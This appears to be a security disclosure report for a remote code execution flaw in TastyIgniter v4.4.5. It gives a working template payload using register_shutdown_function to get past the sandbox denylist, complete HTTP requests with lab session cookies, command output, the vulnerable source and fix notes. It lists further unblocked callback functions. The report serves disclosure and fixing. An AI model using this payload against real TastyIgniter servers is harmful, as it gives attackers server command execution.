### Vulnerability details

**Official website / Product:** https://tastyigniter.com / https://github.com/tastyigniter/TastyIgniter

**Repository:** tastyigniter/TastyIgniter (stars at selection: 3819)

**Vulnerability type:** RCE (TemplateSandbox incomplete denylist bypass → OS command execution)

**Vulnerability versions:** v4.4.5 (release zip `tastyigniter-4.4.5.zip`; `tastyigniter/core` v4.4.5 / commit `a9195226182f`). Residual after the v4.3.1 fix for GHSA-rxg2-q8m5-6fgq.

**Vulnerability URL / Parameter:** `POST /admin/mail_templates/edit/{id}` — form field `MailTemplate[body]` (validated by `SafeMailTemplateContent`); trigger render via `X-IGNITER-REQUEST-HANDLER: onTestTemplate`

**Complex:** yes

### Verification procedure

1. Start the lab (original dir `labs/tastyigniter-r32-a3/`; rebuild with the same topology if cleaned up):
   - Custom image `tastyigniter-r32-a3:local` (based on `php:8.3-apache-bookworm` + extensions) + `mysql:8.0`; host port **21203→80**; containers `tastyigniter-r32-a3-app-1` / `tastyigniter-r32-a3-db-1`; network `tastyigniter-r32-a3_default`; DB volume `tastyigniter-r32-a3_ti_db`.
   - Release: `tastyigniter-4.4.5.zip`, `tastyigniter/core` v4.4.5 / commit `a9195226182f`.
   - `cd labs/tastyigniter-r32-a3 && docker compose up -d --build`; entrypoint waits for DB healthy then runs `php artisan igniter:install --force` (expect-driven). Wait for `storage/framework/.ti_installed`, log line `INSTALLATION COMPLETE`, and HTTP 200 on `http://127.0.0.1:21203/admin/login`.
   - Admin (Owner): `admin@example.com` / `123456` (seeded via artisan after install). Mail templates UI: `/admin/mail_templates`.
2. Log into the admin UI. Open/create a mail template (lab used template_id=**20**, UI `/admin/mail_templates`). Set `MailTemplate[body]` to:
   `{{ register_shutdown_function("system", "id > /tmp/ti-rce-verified; uname -a >> /tmp/ti-rce-verified") }}`
3. Save with `X-IGNITER-REQUEST-HANDLER: onSave` — payload passes `SafeMailTemplateContent` / `TemplateSandbox::assertSafe()` and is stored unchanged (full save packet below).
4. Trigger `X-IGNITER-REQUEST-HANDLER: onTestTemplate`. Blade rendering of the mail body registers the shutdown function; `system(...)` runs as the PHP user when the request ends.
5. Read `/tmp/ti-rce-verified` inside the app container for `id`/`uname` output as `www-data`:
   `docker exec tastyigniter-r32-a3-app-1 cat /tmp/ti-rce-verified`

### Complete vulnerability PoC

Complete HTTP request 1 — save malicious mail template (`onSave`, Docker-verified):

```http
POST /admin/mail_templates/edit/20 HTTP/1.1
Host: 127.0.0.1:21203
User-Agent: curl/8.22.0
Accept: application/json
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-CSRF-TOKEN: M8H07YX4WllCrFjTFCCY0CthmnL70eqZ0ifT00F6
X-Requested-With: XMLHttpRequest
X-IGNITER-REQUEST-HANDLER: onSave
Origin: http://127.0.0.1:21203
Referer: http://127.0.0.1:21203/admin/mail_templates/edit/20
Cookie: tastyigniterlab_session=eyJpdiI6ImZWaG1Sb1BhenlMZnBHMFFhdXV0cmc9PSIsInZhbHVlIjoiYnRLS28wWFRmNDB3VENRcW1VYkZDTEREQldwTFZuclNUTUxwTWhFV3l0eHhSVDh1aUxRYmdIeFBZUjBsbGdscmFrNERXM2ZKWHV2OVY1S2FMN1U0UktiNlg5aDJncFZHRlQ5YVNjWTRjZUtIQjRHWE1UdlJFT0J3bVd0WCs5dUEiLCJtYWMiOiIyMDQwZDEyNDM0ZmI4MjQ3MGYzOTQ5ODZhYzY3ODYzNTQ3YjRmN2M3YTViNGIyZDJlZDM5MDdkNGY3ZTQzNGYwIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IkhMS0xFUUFiN3VCMUtRSzM0dzJUa3c9PSIsInZhbHVlIjoicXdHNEhid1JhWk50REtvVkNyTEdFNEI0ekpXcVVVSHNLOXloNDJPMDNwb2hqU1FqbDV0L3dlWEVBRm54ck83aHAvdzE0QXJtelQrcmJuUXZSUVFacXhqM1NVU0RHbUlDOU5lampkWkZvK2M3MWdiYzF2K3o0eEdCT3o1NzhYTk8iLCJtYWMiOiJhZDQ5ZWMwYWY5YzZhOGJiMThiZDcyMzE0ZWIzMGIxYWExODBmYTNhNGY1N2U5NWE5ZjVhY2ZiZWM1ZWYwMjQ3IiwidGFnIjoiIn0%3D; remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6IlFPVDBTRXJJZjcveDNMY0RRV253WWc9PSIsInZhbHVlIjoiSzVpaE1XSGNXZFdGVU5KOE02TXB0NmZWUUh0N3k5WVpaUzkzR21PQlovbTVrM2VhUjltTGJTOGRMUlVOT1pQOVJLV2tZU0xKWkR6RnAyd3hTYnZpSWk0ZTlRQXllTksvVVFnTUlncUZLVDl1dGg4eEpjVTJSMHpHMDVVaVZ5TXAzc0pFc0FpZ2hhdXNkVzlCZVpxSXZGb0FQTUVmTGNuenB0WHJOVW1lYXpDSjJScXlPYkptSlhWdXp4UG1OTUQ0bFN3YVp6bGdYanFLcGJDMisraFRVaU5aWVRLanBsNVlvdjdpOG9UZU9QRT0iLCJtYWMiOiI3NDVkMDIxYTQyNDk1MTM5OGY5YzIwZjczNzRhMGJlODRiNGVhNWExNmNlOThmZTBhNDVlYWFjYzI3Y2FhMjk2IiwidGFnIjoiIn0%3D
Content-Length: 398
Connection: close

_token=M8H07YX4WllCrFjTFCCY0CthmnL70eqZ0ifT00F6&toolbar_save_action=continue&MailTemplate%5Blabel%5D=Lab+RCE+register_shutdown_function&MailTemplate%5Bsubject%5D=RCE+verify&MailTemplate%5Blayout_id%5D=&MailTemplate%5Bbody%5D=%7B%7B+register_shutdown_function%28%22system%22%2C+%22id+%3E+%2Ftmp%2Fti-rce-verified%3B+uname+-a+%3E%3E+%2Ftmp%2Fti-rce-verified%22%29+%7D%7D&MailTemplate%5Bplain_body%5D=
```

(URL-decoded `MailTemplate[body]` is: `{{ register_shutdown_function("system", "id > /tmp/ti-rce-verified; uname -a >> /tmp/ti-rce-verified") }}`. Cookie/`_token` values are from the original lab capture; replace with a fresh CSRF token and session cookies when reproducing.)

Complete HTTP response 1 (save succeeded; redirect back to edit page):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 01:02:25 GMT
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.3.36
Cache-Control: no-cache, private
Set-Cookie: XSRF-TOKEN=eyJpdiI6IlVxdVNNck56VFFLSHZJUEN3bFZWSkE9PSIsInZhbHVlIjoiNWp1VG5GSmVVQ29wUm5RVlNRMEIxY2Z5VmtPSGIwdGdZUkdoSDMzUkJrQ1Z3ZkpTcUltL2ZtZHY1dVVBY1BzQURIQkg5WEJUM3ZuU01NeFl1a1E0dkROU28rcmV5L292bVhORHI5OTA5eHIvWSs0dGNUSE9CMTl1QWtpemNUR1kiLCJtYWMiOiI1ZWM0ODUxMzQ0NTE1MzUxY2NjMzkyYTE2ODc4OWI3MWM3YzkwODA5N2Y0ODkxMzNkNzRjMzNhMWIxNzQzZTY3IiwidGFnIjoiIn0%3D; expires=Mon, 02 Nov 2026 03:02:25 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: tastyigniterlab_session=eyJpdiI6ImlPTTROL09Sbm9pNG4vU2JMMGtOZFE9PSIsInZhbHVlIjoiWFJ0UmlXeVVzNnZwcm5RQ1JXMS9BMnc4Z0dEd0UrdUNxcHNIZVlwd3BKdkxIVnluRW0vRmIzdnV3eDZaQzl1amI2RGQwMDVPWGIyMXBxUFFtUzROWW5ReEJiSW9mNFdIM0ViVGZIQ2Z2aG5IM29PVWZua3docE0wOEhwMzRESUQiLCJtYWMiOiI0NWNhNzA2NDNmZWQ2YWI3MTI5MGIzMzk0Y2ZhZTdkNjVmMWNmMDAzOWNjMWQxNzJmZGU3Nzk5NGJkNmNlMzM1IiwidGFnIjoiIn0%3D; expires=Mon, 02 Nov 2026 03:02:25 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Connection: close
Transfer-Encoding: chunked
Content-Type: application/json

52
{"X_IGNITER_REDIRECT":"http:\/\/127.0.0.1:21203\/admin\/mail_templates\/edit\/20"}
0

```

Complete HTTP request 2 — trigger render / RCE (`onTestTemplate`, Docker-verified):

```http
POST /admin/mail_templates/edit/20 HTTP/1.1
Host: 127.0.0.1:21203
User-Agent: curl/8.22.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-CSRF-TOKEN: M8H07YX4WllCrFjTFCCY0CthmnL70eqZ0ifT00F6
X-Requested-With: XMLHttpRequest
X-IGNITER-REQUEST-HANDLER: onTestTemplate
Origin: http://127.0.0.1:21203
Referer: http://127.0.0.1:21203/admin/mail_templates/edit/20
Cookie: remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6IlFPVDBTRXJJZjcveDNMY0RRV253WWc9PSIsInZhbHVlIjoiSzVpaE1XSGNXZFdGVU5KOE02TXB0NmZWUUh0N3k5WVpaUzkzR21PQlovbTVrM2VhUjltTGJTOGRMUlVOT1pQOVJLV2tZU0xKWkR6RnAyd3hTYnZpSWk0ZTlRQXllTksvVVFnTUlncUZLVDl1dGg4eEpjVTJSMHpHMDVVaVZ5TXAzc0pFc0FpZ2hhdXNkVzlCZVpxSXZGb0FQTUVmTGNuenB0WHJOVW1lYXpDSjJScXlPYkptSlhWdXp4UG1OTUQ0bFN3YVp6bGdYanFLcGJDMisraFRVaU5aWVRLanBsNVlvdjdpOG9UZU9QRT0iLCJtYWMiOiI3NDVkMDIxYTQyNDk1MTM5OGY5YzIwZjczNzRhMGJlODRiNGVhNWExNmNlOThmZTBhNDVlYWFjYzI3Y2FhMjk2IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6Ik5SeGVvaDI5SkEyaFRERDFDV0lvNXc9PSIsInZhbHVlIjoieEQ0djIrWHU4V29xNGtIVVRFZWZMRHVpaVBuM2dDWVBQYUtuU0hSaU01Q2JnZTRqSnoyYzl2eGtrazB6SHRzMGJPYWxtMmg2Rk1mT3NPOEFUNWVGSTdXaitKWk4xeEh6WnY4UVNOeVNxRDlQMDZqbG43RUdNR1kwbXV0TkkyejgiLCJtYWMiOiJkYzNlYjhiOWExY2NiZjUyOTc5YzkzOGU1MjQ1NDVlN2I3ZmM4YzkzMDZmZTNhZmJhZGM1ZjlkMjE2YzIzNDM0IiwidGFnIjoiIn0%3D; tastyigniterlab_session=eyJpdiI6Ik5NZitlVENubnZFU0tialp5eUZpTlE9PSIsInZhbHVlIjoiOThoWGUrOWc4Q1Q5c29JcThWWG00RFBWT3ZJUnVsL3M4SnNrMEtPaG9rRktwV0hwRlF5L2Zoc016YkhjREZESGd1MEdjOHhYNUV4T2NwZUF3RW4vZzdNVzRTWURKS1pNdEJhWEloeGF1UldESE1MdDdWUlEyMEw1Q29tak1Xc2siLCJtYWMiOiI4N2VjZGZlYjU3OWQzODc1NjQ0ZTI3MDE1MWFhMTIyOWI3OTliMGYyYWM4ZDFiMWI4ZjQ2NDMwZmVjYTAzMTJhIiwidGFnIjoiIn0%3D
Content-Length: 47
Connection: close

_token=M8H07YX4WllCrFjTFCCY0CthmnL70eqZ0ifT00F6
```

Complete HTTP response 2 (success flash that the test message was sent; RCE side effect already completed):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 01:01:58 GMT
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.3.36
Cache-Control: no-cache, private
Set-Cookie: XSRF-TOKEN=eyJpdiI6IkFLT0xRWkVheFE0a1lvVTV1WllDcVE9PSIsInZhbHVlIjoiR0hFeEh3Nis1UHIzZWV6K04xbjFNNURmWWMwd3hLcHBFMGdEK25JanZRaVhmQUNTcjVUZ3FKSlZIek5rQUMyWVB5czhCMGVvVStDeE52VGpwVDBUMVRGNlh1ZklTSWNBMlM1SkxMQm04cThyZ0ZSZEF3RWZKalhOMkZrUTZBUzciLCJtYWMiOiJjMjZiYzVmOTVkYmJmNGIxMWU3ZjZjNGE2NTdhNjhiZjQzNDlhM2Y4ZWIxMWZmMTc4YzE3NmFiYzVkMTIxZmE5IiwidGFnIjoiIn0%3D; expires=Mon, 02 Nov 2026 03:01:58 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: tastyigniterlab_session=eyJpdiI6ImJ1ek1xSHQwbDdOaHhydjNaVkQvd3c9PSIsInZhbHVlIjoiTU5La3BMR3lvblk0emdhK2dJL3JLNkVZM054eXMyT2hRNEtxNDl2WklIZlR5NFlqMU5KazliYjVScDRkV2dLdDQzeWVaRUV0MWxOb2hyZTZYQjYxUzNjQzZWSTdsb0ZQOXJaQ0lkazJlNzdrV21DeElFcnhCRGVFcHo2UERIWFQiLCJtYWMiOiI5YzU3MDQwMGFmNWE1NGZiNGMyNTJiNWRkNDA5OTMwODU5ZTk4NTJmNDkxYjRkOTFmN2IxY2Q4ZjkyMTIxZmJmIiwidGFnIjoiIn0%3D; expires=Mon, 02 Nov 2026 03:01:58 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Connection: close
Transfer-Encoding: chunked
Content-Type: application/json

14b
{"#notification":"            <div\n            class=\"alert alert-success\"\n            data-control=\"flash-message\"\n            data-level=\"success\"\n            data-html=\"Test message successfully sent to admin@example.com\"\n            data-allow-dismiss=\"true\"\n            role=\"alert\"\n        ><\/div>\n    "}
0

```

Verification result notes:

HTTP 200 with success flash that the test message was sent. Running `docker exec tastyigniter-r32-a3-app-1 cat /tmp/ti-rce-verified` yields:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux fdc3863690c4 7.0.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.0.12-2kali1 (2026-06-18) x86_64 GNU/Linux
```

### Vulnerability analysis

TastyIgniter sandboxes mail/theme templates via `TemplateSandbox`. `SafeMailTemplateContent` calls `assertSafe(..., Mail)` on save. `validateExpression()` only rejects callees whose names appear in `DANGEROUS_FUNCTIONS`.

GHSA-rxg2-q8m5-6fgq (CVE-2026-77612) added `call_user_func` / `array_map` / `preg_replace_callback` (and related) and shipped in v4.3.1. On **v4.4.5** the denylist still omits other callable-accepting APIs including `register_shutdown_function`, `array_reduce`, callback-form `ob_start`, `iterator_apply`, and `array_udiff`-family helpers. Consequently:

`{{ register_shutdown_function("system", "<cmd>") }}` passes validation and yields RCE when `onTestTemplate` → `MailHelper::sendTemplate` renders the template through Blade.

This is not an intentional admin shell: TemplateSandbox exists specifically as a security control to block template RCE; this is an unexpected bypass of that control.

### Trigger / sink source (full path and line numbers)

```php
# File: vendor/tastyigniter/core/src/Flame/Pagic/TemplateSandbox.php
# Lines: 24-38 (incomplete DANGEROUS_FUNCTIONS; missing register_shutdown_function / array_reduce, etc.)
    protected const array DANGEROUS_FUNCTIONS = [
        'eval', 'system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open',
        'file_put_contents', 'file_get_contents', 'readfile', 'file', 'scandir', 'glob',
        'fopen', 'fgets', 'fread', 'fwrite', 'fclose', 'fpassthru',
        'base64_decode', 'str_rot13', 'gzinflate', 'gzuncompress', 'gzdecode',
        'create_function', 'assert', 'phpinfo', 'getallheaders', 'header', 'setcookie',
        'move_uploaded_file', 'unlink', 'rmdir', 'mkdir', 'chmod', 'chown',
        'call_user_func', 'call_user_func_array', 'forward_static_call', 'forward_static_call_array',
        'array_map', 'array_filter', 'array_walk', 'array_walk_recursive',
        'usort', 'uasort', 'uksort',
        'preg_replace_callback', 'preg_replace_callback_array',
        'unserialize', 'include', 'require', 'include_once', 'require_once',
        'getenv', 'putenv', 'env', 'config', 'ini_set', 'curl_exec', 'curl_init', 'curl_setopt',
        'fsockopen', 'define', 'extract', 'parse_str', 'chr', 'preg_replace',
    ];
```

```php
# File: vendor/tastyigniter/core/src/Flame/Pagic/TemplateSandbox.php
# Lines: 296-317 (validateExpression only blocks denylisted function names)
        if (!preg_match_all('/\b([a-zA-Z_]\w*)\s*\(/', $scan, $functionMatches, PREG_OFFSET_CAPTURE)) {
            return null;
        }

        foreach ($functionMatches[1] as $index => $functionMatch) {
            $function = $functionMatch[0];
            $offset = $functionMatches[0][$index][1];
            $before = substr($scan, 0, $offset);

            if (preg_match('/->\s*$/', rtrim($before))) {
                continue;
            }

            $functionLower = strtolower($function);

            if (in_array($functionLower, $this->getDangerousFunctions(), true)) {
                return 'Forbidden function: '.$function;
            }
        }

        return null;
```

```php
# File: vendor/tastyigniter/core/src/System/Rules/SafeMailTemplateContent.php
# Lines: 13-37
class SafeMailTemplateContent implements ValidationRule
{
    public function validate(string $attribute, mixed $value, Closure $fail): void
    {
        if (!is_string($value) || $value === '') {
            return;
        }

        try {
            resolve(TemplateSandbox::class)->assertSafe($value, SandboxProfile::Mail);
        } catch (SystemException $systemException) {
            $fail($systemException->getMessage());
        }
    }
}
```

```php
# File: vendor/tastyigniter/core/src/System/Http/Controllers/MailTemplates.php
# Lines: 89-110 (render trigger)
    public function onTestTemplate(?string $context = null, ?string $recordId = null): array
    {
        if (!$recordId) {
            throw new FlashException(lang('igniter::system.mail_templates.alert_template_id_not_found'));
        }

        $model = $this->asExtension(FormController::class)->formFindModelObject($recordId);

        $adminUser = $this->getUser();

        $errorLevel = error_reporting(0);

        MailHelper::sendTemplate($model->code, [], [$adminUser->email, $adminUser->name]);

        error_reporting($errorLevel);

        flash()->success(sprintf(lang('igniter::system.mail_templates.alert_test_message_sent'), $adminUser->staff_email));

        return [
            '#notification' => $this->makePartial('flash'),
        ];
    }
```

### Fix notes

1. Add `register_shutdown_function`, `array_reduce`, callback-form `ob_start`, `iterator_apply`, and the `array_u*` / `*_uassoc` callback family to `DANGEROUS_FUNCTIONS` (or switch to a strict allowlist).
2. Reject string callables / user-controlled function-name arguments in template expressions.
3. Extend `TemplateSandboxTest` with regression cases for this PoC class.
